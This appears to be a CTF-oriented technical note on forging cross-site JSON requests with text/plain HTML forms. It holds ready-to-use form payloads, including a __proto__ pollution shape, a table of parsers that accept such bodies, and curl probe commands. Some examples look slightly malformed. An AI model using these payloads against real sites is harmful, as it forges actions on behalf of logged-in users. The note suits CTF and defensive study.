# The content-type gate — what a form can send, and what the parser accepts

A cross-origin `<form>` can only produce three content types. The
CSRF gate is whether the endpoint's body parser accepts one of them.

---

## 1. The three form-producible types

```html
<form enctype="application/x-www-form-urlencoded">  <!-- default -->
<form enctype="multipart/form-data">
<form enctype="text/plain">
```

| enctype | The wire body | What a parser sees |
|---|---|---|
| `application/x-www-form-urlencoded` | `name=value&name2=value2` — percent-encoded | `{'name':'value'}` — a flat dict |
| `multipart/form-data` | `------boundary\r\nContent-Disposition: form-data; name="x"\r\n\r\nvalue\r\n--` | `{'x':'value'}` + file fields |
| `text/plain` | `name=value\r\nname2=value2` — NO percent-encoding | the raw text — body sniffers see it |

`text/plain` is the CTF-critical one — no percent-encoding means a
body that LOOKS like JSON ships byte-for-byte to a `json.loads`/
`ShouldBindJSON`/sniffing parser.

## 2. The `text/plain` → JSON assembly — the canonical trick

A form serializes each `<input>` as `name` + `=` + `value` joined
by newlines (text/plain) or `&` (urlencoded). The `=` is INSERTED —
you can't avoid it — so the JSON must absorb one `=` inside its
structure.

```html
<form method="POST" action="https://target/update" enctype="text/plain">
  <input name='{"name":"csrf-marker","ignore":"' value='"}'>
</form>
<!-- the wire body: {"name":"csrf-marker","ignore":"="}
     — the '=' lands inside the 'ignore' value — VALID JSON -->
```

The anatomy:
- `name` field = `{"name":"csrf-marker","ignore":"` — the JSON head,
  ending inside a string value
- `=` (inserted by the form) — absorbed as part of the `ignore`
  value's content
- `value` = `"}` — the JSON tail
- joined body = `{"name":"csrf-marker","ignore":"="}` — parses

## 3. The variants by field count

```html
<!-- two-field: each = needs absorbing -->
<input name='{"a":"' value='x","ignore1":"'>
<input name='","b":"' value='y","ignore2":"'}'>
<!-- body: {"a":"x","ignore1":"=
","b":"y","ignore2":""} — the newline is inside a string -->

<!-- urlencoded variant — & and = inserted -->
<input name='{"a":"' value='x","i1":"'>
<input name='","b":"' value='y","i2":"'}'>
<!-- body: {"a":"x","i1":"=&","b":"y","i2":"=}
     — the & lands inside a string — still parses -->
```

Each extra `=`/`&` needs a string-value slot to land in — the
`"ignore":"<separator>"` pattern absorbs each one.

## 4. The nested/multi-line shapes

```html
<!-- deeper JSON — more separators to absorb -->
<input name='{"config":{"x":1,"y":{"__proto__":{"m":' value='1}}},"ignore":"'}'>
<!-- body: {"config":{"x":1,"y":{"__proto__":{"m":1}}},"ignore":"="} -->

<!-- a raw-body POST — the whole JSON in ONE name with empty value -->
<input name='{"a":1,"b":"' value='"}'>
<!-- body: {"a":1,"b":"="} — one absorber -->
```

The rule: every `=` the form inserts needs a `"..."` string to land
inside. The absorber key is usually called `ignore`, `_`, `x`,
`padding`, or a field the endpoint already expects.

## 5. The parser behaviors that accept it

| Parser | Accepts `text/plain`? |
|---|---|
| Python `json.loads(request.body)` — content-agnostic | YES — parses whatever text the body holds |
| Tornado `self.request.body` + `json.loads` | YES |
| Gin `ShouldBindJSON` | YES — binds JSON regardless of Content-Type (the SSOS card's ground truth) |
| Express `express.json()` | NO — requires `application/json` content-type |
| Express `bodyParser.text()` then `JSON.parse` | YES — the text path accepts |
| Flask `request.get_json(force=True)` | YES — `force=True` skips the content-type check |
| Flask `request.get_json()` default | NO — requires `application/json` |
| Django `json.loads(request.body)` | YES |
| FastAPI `body: dict` | NO — typed, requires JSON content-type |
| FastAPI `await request.body()` + `json.loads` | YES |
| Rails `JSON.parse(request.body.read)` | YES |
| Rails `params` parser on `text/plain` | partial — depends |
| Spring `@RequestBody Map` | NO — requires `application/json` |
| `json_decode(file_get_contents('php://input'))` | YES — PHP raw-body |
| `ShouldBindJSON`/`BindJSON`/`c.Bind` | YES — the Gin family |
| mux `json.NewDecoder(r.Body).Decode` | YES — Go raw-body decode |

The pattern: a parser that reads `request.body`/`php://input`/
`r.Body` as BYTES then `json.loads`s it ignores the Content-Type —
`text/plain` reaches it. A parser that keys on the Content-Type
header (`express.json()`, `request.get_json()` strict,
`@RequestBody`) rejects it.

## 6. When the endpoint REALLY wants `application/json`

```html
<!-- a form CANNOT send application/json — the enctype list is closed.
     the alternatives:
     1. text/plain + a lenient parser (above)
     2. multipart with a JSON field — some parsers read a JSON part
     3. fetch() with mode:'no-cors' — can send text/plain only,
        NOT application/json (pre-flight would gate it)
     4. a JSON part inside multipart -->
<form enctype="multipart/form-data">
  <input type="file" name="doc"> — a file field carries raw bytes
</form>
```

`fetch` with `mode:'no-cors'` + `Content-Type: application/json` —
the browser treats a non-simple content-type as needing preflight;
in `no-cors` mode the preflight is skipped AND the content-type is
downgraded? No — `no-cors` mode restricts the request to CORS-safe
headers — `application/json` is NOT CORS-safe; the browser strips
it back to `text/plain`. So `no-cors` fetch can NOT send
`application/json` either.

## 7. The multipart-JSON carrier

```html
<form method="POST" enctype="multipart/form-data" action="$BASE/update">
  <input type="file" name="doc">   <!-- browse a file containing
       the JSON as its bytes -->
</form>
<!-- or the trick: a text field whose VALUE is JSON, and the parser
     treats the whole multipart part as the JSON -->
<input name="config" value='{"a":1,"b":"x"}'>
```

`multipart` bodies carry `Content-Disposition: form-data; name="x"`
parts — a part's content can be arbitrary text including JSON —
a parser that reads `form["config"]` as a JSON string parses it.
Same absorb-the-`=` rule doesn't apply here (multipart has no `=`
joining), but each field is separate.

## 8. The "the parser reads the body as JSON anyway" fingerprint

```bash
# send text/plain with a JSON-shaped body — does it parse?
curl -i -X POST "$BASE/update" -H 'Content-Type: text/plain' \
  -d '{"name":"csrf-marker"}' -b "$COOKIE_JAR"
# 200 + the marker lands → parser ignores content-type — form reaches it
# 400/415 → a strict content-type gate — JSON is unreachable by a form

# send urlencoded with a JSON-shaped name
curl -i -X POST "$BASE/update" -d '{"name":"x","i":"'='=y"}' -b "$COOKIE_JAR"
# does the flat-dict parser or a JSON sniffer fire?
```

## 9. The urlencoded-JSON hybrid

```bash
# when the parser checks keys, not the whole body
# a flat-dict endpoint that does obj['key'] reads
{"name":"x","ignore":"="}   → a flat dict? name is the LITERAL key
                            '{"name":"x","ignore":"' — not useful
# but a body-SNIFFER that tries json.loads on the whole body works:
{"a":"x","i":"=&"}          → a sniffer parses it
```

urlencoded's `&`-join is harder to absorb than text/plain's `\n` —
`text/plain` is almost always the right carrier.

## 10. The falsifier

```text
The endpoint requires a content type a form cannot produce AND
its parser enforces it: express.json() with strict content-type,
@RequestBody application/json, request.get_json() without force,
a middleware that 415s non-JSON. Every form carrier fails; the
class closes for that endpoint (a different delivery — websocket,
or an XSS in the origin — is the next class to try).
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "content-type-gate: /update accepts text/plain json via sniff"
```
